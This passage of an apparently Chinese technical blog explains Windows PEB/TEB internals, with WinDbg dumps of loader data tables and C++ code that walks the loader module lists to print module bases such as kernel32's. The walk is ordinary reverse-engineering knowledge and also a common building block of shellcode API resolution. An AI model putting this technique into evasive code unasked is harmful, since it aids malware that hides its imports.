class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x014b45d0</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x14b49c0</span> - <span class="number">0x14b40c0</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b49c0</span> _LIST_ENTRY [ <span class="number">0x14b4810</span> - <span class="number">0x14b45d0</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x014b40c0</span> _LIST_ENTRY [ <span class="number">0x14b45d0</span> - <span class="number">0x14b41d8</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x14b49c8</span> - <span class="number">0x14b40c8</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b49c8</span> _LIST_ENTRY [ <span class="number">0x14b4818</span> - <span class="number">0x14b45d8</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x014b40c8</span> _LIST_ENTRY [ <span class="number">0x14b45d8</span> - <span class="number">0x14b41e0</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x14b4820</span> - <span class="number">0x14b49d0</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b4820</span> _LIST_ENTRY [ <span class="number">0x77eceb3c</span> - <span class="number">0x14b45e0</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x014b49d0</span> _LIST_ENTRY [ <span class="number">0x14b45e0</span> - <span class="number">0x14b40d0</span> ]</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0x76310000</span> Void            <span class="comment">// &lt;=== 指向KERNEL32.DLL的基址</span></span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : <span class="number">0x763277c0</span> Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0xf0000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\\WINDOWS\\System32\\KERNEL32.DLL&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x40</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x42</span></span><br><span class="line">      +<span class="number">0x004</span> Buffer           : <span class="number">0x014b46e8</span>  <span class="string">&quot;C:\\WINDOWS\\System32\\KERNEL32.DLL&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;KERNEL32.DLL&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x18</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x1a</span></span><br><span class="line">      +<span class="number">0x004</span> Buffer           : <span class="number">0x014b4710</span>  <span class="string">&quot;KERNEL32.DLL&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略...</span><br></pre></td></tr></table></figure><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get_LDR_Data_Table.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// InLoadOrderModuleList</span></span><br><span class="line"><span class="function">VOID <span class="title">GetInLoadOrderModuleList</span><span class="params">(DWORD* PEB)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PDWORD Ldr = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* InLoad = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* Kernel32 = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* p = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* BaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* BaseDllName = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* FullDllName = <span class="literal">NULL</span>;</span><br><span class="line">    Ldr = *(PDWORD*)((<span class="type">unsigned</span> <span class="type">char</span>*)PEB + <span class="number">0x0c</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;得到LDR指针：%x\r\n&quot;, Ldr);</span></span><br><span class="line">    InLoad = *(DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)Ldr + <span class="number">0x0c</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;得到InLoadOrderModuleList结构指针：%x\r\n&quot;, InLoad);</span></span><br><span class="line">    <span class="comment">// Kernel32 = *(DWORD**)((unsigned char*)InLoad + 0x18);</span></span><br><span class="line">    <span class="comment">// printf(&quot;得到Kernel32基址：%x\r\n&quot;, Kernel32);</span></span><br><span class="line">    p = InLoad;</span><br><span class="line">    p = *((DWORD**)p);</span><br><span class="line">    <span class="keyword">while</span> (InLoad != p)</span><br><span class="line">    &#123;</span><br><span class="line">        BaseAddress = *((DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)p + <span class="number">0x18</span>));   <span class="comment">// DllBase</span></span><br><span class="line">        BaseDllName = *((DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)p + <span class="number">0x30</span>));   <span class="comment">// BaseDllName</span></span><br><span class="line">        FullDllName = *((DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)p + <span class="number">0x28</span>));   <span class="comment">// FullDllName</span></span><br><span class="line">        <span class="keyword">if</span> (BaseAddress ==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;镜像基址：0x%-20x 模块名称：%S\r\n ---&gt; 模块路径：%S\n&quot;</span>, BaseAddress, (<span class="type">unsigned</span> <span class="type">char</span>*)BaseDllName, (<span class="type">unsigned</span> <span class="type">char</span>*)FullDllName);</span><br><span class="line">        p = *((DWORD**)p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// InMemoryOrderModuleList</span></span><br><span class="line"><span class="function">VOID <span class="title">GetInMemoryOrderModuleList</span><span class="params">(DWORD* PEB)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD* Ldr = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* InMemory = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* Kernel32 = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* p = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* BaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* BaseDllName = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD* FullDllName = <span class="literal">NULL</span>;</span><br><span class="line">    Ldr = *(DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)PEB + <span class="number">0x0c</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;得到LDR结构指针：%x\r\n&quot;, Ldr);</span></span><br><span class="line">    InMemory = *(DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)Ldr + <span class="number">0x14</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;得到InMemoryOrderModuleList结构指针：%x\r\n&quot;, InMemory);</span></span><br><span class="line">    <span class="comment">//Kernel32 = *(DWORD**)((unsigned char*)InMemory + 0x10);</span></span><br><span class="line">    <span class="comment">// printf(&quot;得到Kernel32基址：%x\r\n&quot;, Kernel32);</span></span><br><span class="line">    p = InMemory;</span><br><span class="line">    p = *((DWORD**)p);</span><br><span class="line">    <span class="keyword">while</span> (InMemory != p)</span><br><span class="line">    &#123;</span><br><span class="line">        BaseAddress = *((DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)p + <span class="number">0x10</span>));</span><br><span class="line">        BaseDllName = *((DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)p + <span class="number">0x28</span>));</span><br><span class="line">        FullDllName = *((DWORD**)((<span class="type">unsigned</span> <span class="type">char</span>*)p + <span class="number">0x20</span>));</span><br><span class="line">        <span class="keyword">if</span> (BaseAddress == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;镜像基址：0x%-20x 模块名称：%S\r\n ---&gt; 模块路径：%S\n&quot;</span>, BaseAddress, (<span class="type">const</span> <span class="type">char</span>*)BaseDllName, (<span class="type">const</span> <span class="type">char</span>*)FullDllName);</span><br><span class="line">        p = *((DWORD**)p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD* PEB = <span class="literal">NULL</span>;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">0x30</span>]</span><br><span class="line">        mov PEB, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;得到PEB指针：0x%08x\r\n&quot;</span>, PEB);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">GetInLoadOrderModuleList</span>(PEB);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">GetInMemoryOrderModuleList</span>(PEB);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    _TEB* pTeb = <span class="built_in">NtCurrentTeb</span>();</span><br><span class="line">    PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + <span class="number">0x30</span>);</span><br><span class="line">    PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + <span class="number">0x0c</span>);</span><br><span class="line">    PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + <span class="number">0x0c</span>);</span><br><span class="line">    PDWORD pModExe = (PDWORD)*pInLoadOrderLinks;</span><br><span class="line">    PDWORD pModNtDll = (PDWORD)*pModExe;</span><br><span class="line">    PDWORD pModKernel32 = (PDWORD)*pModNtDll;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;镜像基址：0x%-20x 模块名称：%S\r\n ---&gt; 模块路径：%S\n&quot;</span>, pModKernel32[<span class="number">6</span>], (<span class="type">const</span> <span class="type">char</span>*)pModKernel32[<span class="number">12</span>], (<span class="type">const</span> <span class="type">char</span>*)pModKernel32[<span class="number">10</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="64位TEB-PEB查找"><a href="#64位TEB-PEB查找" class="headerlink" title="64位TEB&#x2F;PEB查找"></a>64位TEB&#x2F;PEB查找</h2><h3 id="windbg查找"><a href="#windbg查找" class="headerlink" title="windbg查找"></a>windbg查找</h3><blockquote><p>在遍历<code>InMemoryOrderModuleList</code>链表时, 地址需<code>-0x10</code>;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !peb</span><br><span class="line">PEB at <span class="number">000000</span>d737450000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         <span class="number">00007f</span>f723010000</span><br><span class="line">    NtGlobalFlag:             <span class="number">70</span></span><br><span class="line">    NtGlobalFlag2:            <span class="number">0</span></span><br><span class="line">    Ldr                       <span class="number">00007f</span>fc29996440</span><br><span class="line">    Ldr.Initialized:          Yes</span><br><span class="line">    Ldr.InInitializationOrderModuleList: <span class="number">00000275005e4450</span> . <span class="number">00000275005e4</span>d20</span><br><span class="line">    Ldr.InLoadOrderModuleList:           <span class="number">00000275005e4620</span> . <span class="number">00000275005</span>edae0</span><br><span class="line">    Ldr.InMemoryOrderModuleList:         <span class="number">00000275005e4630</span> . <span class="number">00000275005</span>edaf0</span><br><span class="line">                    Base TimeStamp                     Module</span><br><span class="line">            <span class="number">7f</span>f723010000 <span class="number">666289</span>ca Jun <span class="number">07</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">14</span> <span class="number">2024</span> D:\Tencent\WeChat\WeChat.exe</span><br><span class="line">            <span class="number">7f</span>fc29810000 <span class="number">67</span>ca8829 Mar <span class="number">07</span> <span class="number">13</span>:<span class="number">46</span>:<span class="number">17</span> <span class="number">2025</span> C:\WINDOWS\SYSTEM32\ntdll.dll</span><br><span class="line">            <span class="number">7f</span>fc286f0000 <span class="number">36466623</span> Nov <span class="number">09</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">51</span> <span class="number">1998</span> C:\WINDOWS\System32\KERNEL32.DLL</span><br><span class="line">            <span class="number">7f</span>fc270e0000 <span class="number">44653e19</span> May <span class="number">13</span> <span class="number">10</span>:<span class="number">02</span>:<span class="number">01</span> <span class="number">2006</span> C:\WINDOWS\System32\KERNELBASE.dll</span><br><span class="line">            <span class="number">7f</span>fc27630000 <span class="number">3b</span>26444f Jun <span class="number">13</span> <span class="number">00</span>:<span class="number">33</span>:<span class="number">19</span> <span class="number">2001</span> C:\WINDOWS\System32\USER32.dll</span><br><span class="line">            <span class="number">7f</span>fc26e70000 <span class="number">331718</span>eb Mar <span class="number">01</span> <span class="number">01</span>:<span class="number">42</span>:<span class="number">03</span> <span class="number">1997</span> C:\WINDOWS\System32\win32u.dll</span><br><span class="line">            <span class="number">7f</span>fc286c0000 <span class="number">533</span>dc7aa Apr <span class="number">04</span> <span class="number">04</span>:<span class="number">42</span>:<span class="number">18</span> <span class="number">2014</span> C:\WINDOWS\System32\GDI32.dll</span><br><span class="line">            <span class="number">7f</span>fc26f20000 <span class="number">05</span>ca1d5d Jan <span class="number">29</span> <span class="number">13</span>:<span class="number">04</span>:<span class="number">29</span> <span class="number">1973</span> C:\WINDOWS\System32\gdi32full.dll</span><br><span class="line">            <span class="number">7f</span>fc27040000 <span class="number">8e0806</span>c9 Jul <span class="number">06</span> <span class="number">02</span>:<span class="number">04</span>:<span class="number">57</span> <span class="number">2045</span> C:\WINDOWS\System32\msvcp_win.dll</span><br><span class="line">            <span class="number">7f</span>fc26b40000 <span class="number">10</span>c46e71 Dec <span class="number">01</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">45</span> <span class="number">1978</span> C:\WINDOWS\System32\ucrtbase.dll</span><br><span class="line">            <span class="number">7f</span>fc29410000 dac79f47 Apr <span class="number">25</span> <span class="number">03</span>:<span class="number">38</span>:<span class="number">47</span> <span class="number">2086</span> C:\WINDOWS\System32\ADVAPI32.dll</span><br><span class="line">            <span class="number">7f</span>fc28be0000 <span class="number">657b</span>2709 Dec <span class="number">15</span> <span class="number">00</span>:<span class="number">02</span>:<span class="number">17</span> <span class="number">2023</span> C:\WINDOWS\System32\msvcrt.dll</span><br><span class="line">            <span class="number">7f</span>fc28580000 <span class="number">47</span>af1f27 Feb <span class="number">10</span> <span class="number">23</span>:<span class="number">58</span>:<span class="number">31</span> <span class="number">2008</span> C:\WINDOWS\System32\sechost.dll</span><br><span class="line">            <span class="number">7f</span>fc26c60000 <span class="number">5</span>a31de46 Dec <span class="number">14</span> <span class="number">10</span>:<span class="number">13</span>:<span class="number">26</span> <span class="number">2017</span> C:\WINDOWS\System32\bcrypt.dll</span><br><span class="line">            <span class="number">7f</span>fc29130000 <span class="number">1</span>caf5f33 Apr <span class="number">02</span> <span class="number">10</span>:<span class="number">00</span>:<span class="number">19</span> <span class="number">1985</span> C:\WINDOWS\System32\RPCRT4.dll</span><br><span class="line">            <span class="number">7f</span>fc27a10000 <span class="number">8</span>ec472d1 Nov <span class="number">26</span> <span class="number">00</span>:<span class="number">12</span>:<span class="number">01</span> <span class="number">2045</span> C:\WINDOWS\System32\SHELL32.dll</span><br><span class="line">            <span class="number">7f</span>fc283c0000 <span class="number">99614267</span> Jul <span class="number">18</span> <span class="number">18</span>:<span class="number">13</span>:<span class="number">59</span> <span class="number">2051</span> C:\WINDOWS\System32\ole32.dll</span><br><span class="line">            <span class="number">7f</span>fc287d0000 eadd58d3 Nov <span class="number">12</span> <span class="number">12</span>:<span class="number">32</span>:<span class="number">19</span> <span class="number">2094</span> C:\WINDOWS\System32\combase.dll</span><br><span class="line">            <span class="number">7f</span>fc294d0000 <span class="number">672b</span>2c78 Nov <span class="number">06</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">40</span> <span class="number">2024</span> C:\WINDOWS\System32\SHLWAPI.dll</span><br><span class="line">            <span class="number">7f</span>fc06d90000 <span class="number">1</span>aaf409d Mar <span class="number">09</span> <span class="number">23</span>:<span class="number">09</span>:<span class="number">17</span> <span class="number">1984</span> C:\WINDOWS\WinSxS\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1<span class="number">.1</span><span class="number">.22621</span><span class="number">.3672</span>_none_57feacb6ce14a323\gdiplus.dll</span><br><span class="line"></span><br><span class="line">略...</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x00000275005e4630</span><span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4430</span> - <span class="number">0x00007ffc</span>`<span class="number">29996450</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e4430</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 - <span class="number">0x00000275</span>`<span class="number">005e4620</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00007ffc</span>`<span class="number">29996450</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4620</span> - <span class="number">0x00000275</span>`<span class="number">005</span>edae0 ]</span><br><span class="line">   +<span class="number">0x010</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4440</span> - <span class="number">0x00007ffc</span>`<span class="number">29996460</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e4440</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 - <span class="number">0x00000275</span>`<span class="number">005e4630</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00007ffc</span>`<span class="number">29996460</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4630</span> - <span class="number">0x00000275</span>`<span class="number">005</span>edaf0 ]</span><br><span class="line">   +<span class="number">0x020</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x00000000</span>`<span class="number">00000000</span> - <span class="number">0x00000000</span>`<span class="number">00000000</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : (null) </span><br><span class="line">      +<span class="number">0x008</span> Blink            : (null) </span><br><span class="line">   +<span class="number">0x030</span> DllBase          : <span class="number">0x00007ff7</span>`<span class="number">23010000</span> Void           <span class="comment">// &lt;=== 指向程序本身</span></span><br><span class="line">   +<span class="number">0x038</span> EntryPoint       : <span class="number">0x00007ff7</span>`<span class="number">2301</span>c148 Void</span><br><span class="line">   +<span class="number">0x040</span> SizeOfImage      : <span class="number">0xa5000</span></span><br><span class="line">   +<span class="number">0x048</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;D:\\Tencent\\WeChat\\WeChat.exe&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x38</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x3a</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00000275</span>`<span class="number">005e41</span>c0  <span class="string">&quot;D:\\Tencent\\WeChat\\WeChat.exe&quot;</span></span><br><span class="line">   +<span class="number">0x058</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;WeChat.exe&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x14</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x16</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00000275</span>`<span class="number">005e41</span>e4  <span class="string">&quot;WeChat.exe&quot;</span></span><br><span class="line">   +<span class="number">0x068</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略...</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x00000275</span>`<span class="number">005e4440</span><span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 - <span class="number">0x00000275</span>`<span class="number">005e4620</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5440</span> - <span class="number">0x00000275</span>`<span class="number">005e4430</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4620</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4430</span> - <span class="number">0x00007ffc</span>`<span class="number">29996450</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 - <span class="number">0x00000275</span>`<span class="number">005e4630</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5450</span> - <span class="number">0x00000275</span>`<span class="number">005e4440</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4630</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4440</span> - <span class="number">0x00007ffc</span>`<span class="number">29996460</span> ]</span><br><span class="line">   +<span class="number">0x020</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5460</span> - <span class="number">0x00007ffc</span>`<span class="number">29996470</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e5460</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d20 - <span class="number">0x00000275</span>`<span class="number">005e4450</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00007ffc</span>`<span class="number">29996470</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4450</span> - <span class="number">0x00000275</span>`<span class="number">005e4</span>d20 ]</span><br><span class="line">   +<span class="number">0x030</span> DllBase          : <span class="number">0x00007ffc</span>`<span class="number">29810000</span> Void       <span class="comment">// &lt;=== 指向ntdll.dll基址</span></span><br><span class="line">   +<span class="number">0x038</span> EntryPoint       : (null) </span><br><span class="line">   +<span class="number">0x040</span> SizeOfImage      : <span class="number">0x217000</span></span><br><span class="line">   +<span class="number">0x048</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\\WINDOWS\\SYSTEM32\\ntdll.dll&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x3a</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x3c</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span 